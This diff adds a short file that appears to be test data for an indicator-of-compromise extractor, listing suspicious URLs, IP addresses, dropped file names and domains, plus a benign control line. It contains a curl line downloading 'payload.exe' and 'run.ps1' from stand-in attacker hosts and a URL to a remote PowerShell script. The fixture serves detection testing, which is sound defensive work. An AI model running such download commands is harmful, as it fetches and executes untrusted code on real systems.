@@ -1,0 +1,19 @@
+Backup URL: https://cdn.bad-domain.net/update.ps1
+curl http://evil.com/payload.exe http://backup.com/run.ps1
+
+Connect to 192.168.1.25 for staging
+Fallback IP: 45.67.89.10
+
+Dropped files may include:
+payload.exe
+loader.dll
+update.ps1
+run.bat
+double.exe.exe
+
+Possible domain references:
+evil.example.com
+bad-domain.net
+internal.local
+
+Benign-looking string with no IOC: hello world
